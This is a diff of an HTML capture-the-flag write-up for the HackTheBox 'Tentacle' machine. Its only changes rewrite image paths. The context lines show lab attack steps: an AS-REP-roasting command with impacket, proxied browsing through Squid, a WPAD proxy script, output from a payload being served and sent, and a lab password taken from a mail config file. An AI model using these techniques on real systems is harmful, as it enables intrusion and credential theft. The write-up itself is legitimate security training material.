@@ -153,7 +153,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds
 </code></pre><pre tabindex=0><code>└─$ date; ntpdate -q 10.10.10.224
 Wed Sep 27 05:30:03 PM BST 2023
 2023-09-27 17:29:22.601161 (+0100) -40.729112 +/- 0.083173 10.10.10.224 s10 no-leap
-</code></pre><ul><li><code>squid</code> version <code>4.11</code><ul><li><code>srv01.realcorp.htb</code></li><li>user: <code>j.nakazawa@realcorp.htb</code></li></ul></li></ul><p><img src=./images/1.png></p><h2 id=foothold>Foothold</h2><ul><li>Let&rsquo;s check if <code>j.nakazawa</code> is <code>AS-REP-Roastable</code></li></ul><pre tabindex=0><code>└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.224 realcorp.htb/j.nakazawa  
+</code></pre><ul><li><code>squid</code> version <code>4.11</code><ul><li><code>srv01.realcorp.htb</code></li><li>user: <code>j.nakazawa@realcorp.htb</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tentacle/images/1.png></p><h2 id=foothold>Foothold</h2><ul><li>Let&rsquo;s check if <code>j.nakazawa</code> is <code>AS-REP-Roastable</code></li></ul><pre tabindex=0><code>└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.224 realcorp.htb/j.nakazawa  
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Getting TGT for j.nakazawa
@@ -217,7 +217,7 @@ PORT     STATE SERVICE
 3128/tcp open  squid-http
 
 Nmap done: 1 IP address (1 host up) scanned in 654.09 seconds
-</code></pre><ul><li>Now we see port <code>80</code><ul><li>I opened <code>firefox</code> as <code>proxychains -f proxy-to-squid.conf firefox</code></li><li>Visiting http://10.197.243.31/ shows default page</li><li>While <a href=http://wpad.realcorp.htb/ target=_blank rel=noopener>http://wpad.realcorp.htb/</a> results in <code>403</code></li></ul></li></ul><p><img src=./images/2.png></p><p><img src=./images/3.png></p><ul><li>But if we check for <a href=http://wpad.realcorp.htb/wpad.dat target=_blank rel=noopener>http://wpad.realcorp.htb/wpad.dat</a><ul><li><a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad target=_blank rel=noopener>https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad</a></li></ul></li></ul><pre tabindex=0><code>function FindProxyForURL(url, host) {
+</code></pre><ul><li>Now we see port <code>80</code><ul><li>I opened <code>firefox</code> as <code>proxychains -f proxy-to-squid.conf firefox</code></li><li>Visiting http://10.197.243.31/ shows default page</li><li>While <a href=http://wpad.realcorp.htb/ target=_blank rel=noopener>http://wpad.realcorp.htb/</a> results in <code>403</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tentacle/images/2.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tentacle/images/3.png></p><ul><li>But if we check for <a href=http://wpad.realcorp.htb/wpad.dat target=_blank rel=noopener>http://wpad.realcorp.htb/wpad.dat</a><ul><li><a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad target=_blank rel=noopener>https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad</a></li></ul></li></ul><pre tabindex=0><code>function FindProxyForURL(url, host) {
     if (dnsDomainIs(host, &#34;realcorp.htb&#34;))
         return &#34;DIRECT&#34;;
     if (isInNet(dnsResolve(host), &#34;10.197.243.0&#34;, &#34;255.255.255.0&#34;))
@@ -295,7 +295,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 [*] Connected, sending payload
 [*] Payload sent
 [*] Done
-</code></pre><p><img src=./images/4.png></p><h2 id=user-1>User #1</h2><ul><li>During enumeration, I found a <code>.msmtprc</code> file in <code>j.nakazawa</code>&rsquo;s home directory<ul><li>We have potential creds for <code>j.nakazawa:sJB}RM>6Z~64_</code></li></ul></li></ul><pre tabindex=0><code>root@smtp:/home/j.nakazawa# ls -lha
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tentacle/images/4.png></p><h2 id=user-1>User #1</h2><ul><li>During enumeration, I found a <code>.msmtprc</code> file in <code>j.nakazawa</code>&rsquo;s home directory<ul><li>We have potential creds for <code>j.nakazawa:sJB}RM>6Z~64_</code></li></ul></li></ul><pre tabindex=0><code>root@smtp:/home/j.nakazawa# ls -lha
 ls -lha
 total 16K
 drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Dec  9  2020 .
